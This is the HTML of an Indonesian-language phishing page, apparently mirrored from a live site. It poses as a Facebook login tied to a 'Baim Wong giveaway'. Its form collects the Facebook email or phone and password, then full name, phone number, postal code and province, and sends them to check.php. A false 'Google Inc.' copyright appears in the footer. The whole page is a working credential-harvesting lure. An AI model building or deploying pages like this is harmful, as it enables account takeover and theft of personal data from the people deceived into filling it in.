
<!=[] ★OBETBET★ --!>
  <!DOCTYPE html>
<html>
  

<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='obetbet/bet/thumbnail.png' rel='icon' type='image/x-png'/>
<title>ISI DATA</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="ccss/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(obetbet/ff.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">
</div>
<center style="background:#EBA300;">

</div>
<center style="background:#EBA300;"><br>
<div class="col-md-8">
<h2>
<h2>
</h2>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#FFFFFF;width:100%" class="form-horizontal">
<h4 >

<form action="check.php" method="POST">


<h4 >
<img src="http://www.freepngimg.com/thumb/facebook/2-2-facebook-free-download-png-thumb.png" height="50px" width="50px">
  <b> LOGIN FACEBOOKK </b>
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb1" placeholder="Email/ Phone Number" type="text" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb2" placeholder="Masukkan Kata Sandi" type="password" required>
<br>
</div>


<h4 >
<img src="obetbet/ff.png" height="50px" width="50px">
  <b> MASUKKAN BIODTE </b>
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="nickname" placeholder="Masukkan Nama Lengkap" type="text" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="nickname" placeholder="Masukkan Nomer Handphone" type="text" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="nickname" placeholder="Masukkan Kode Pos" type="text" required>
</div>
<div style="width:100%" class="form-group">
        <select class="form-control" name="level">
          <option>PROVINSI</option>
          <option>Aceh</option>
          <option>Sumatera Utara</option>
          <option>Sumatera Barat</option>
          <option>Riau</option>
          <option>Kepulauan Riau</option>
		  <option>Jambi</option>
		  <option>Bengkulu</option>
		  <option>Sumatera Selatan</option>
		  <option>Kepulauan Bangka Belitung</option>
		  <option>Lampung 10</option>
                 <option>Banten</option>
		 <option>Jawa Barat</option>
		 <option>DKI Jakarta</option>
		 <option>Jawa Tengah</option>
		 <option>DI Yogyakarta</option>
		 <option>Jawa Timur</option>
		 <option>Bali</option>
		 <option>Nusa Tenggara Barat</option>
		 <option>Nusa Tenggara Timur</option>
		 <option>Kalimantan Utara</option>
		 <option>Kalimantan Barat</option>
		 <option>Kalimantan Tengah</option>
		 <option>Kalimantan Selatan</option>
		 <option>Kalimantan Timur</option>
		 <option>Gorontalo</option>
		 <option>Sulawesi Tengah</option>
		 <option>Sulawesi Utara</option>
		 <option>Sulawesi Selatan</option>
		 <option>Sulawesi Barat</option>
		 <option>Maluku Utara</option>
		 <option>Maluku</option>
		 <option>Papua Barat</option>
		 <option>Papua</option>
        </select>
</div>

 <input type="submit" class="btn btn-block" style="color: #FFFFFF;background-color:  #EBA300 ;" value="LANJUTKAN PROSES"> </form>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
 
</div>
</div><br><br>
</div>

</div></div><br>
		  
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>Masukkan Data Diri Anda Di Atas GIVEAWAY BAIM WONG </p></center></p>
<p>Copyright &copy; 2019 Google Inc.</p></div>
</body>

</html>







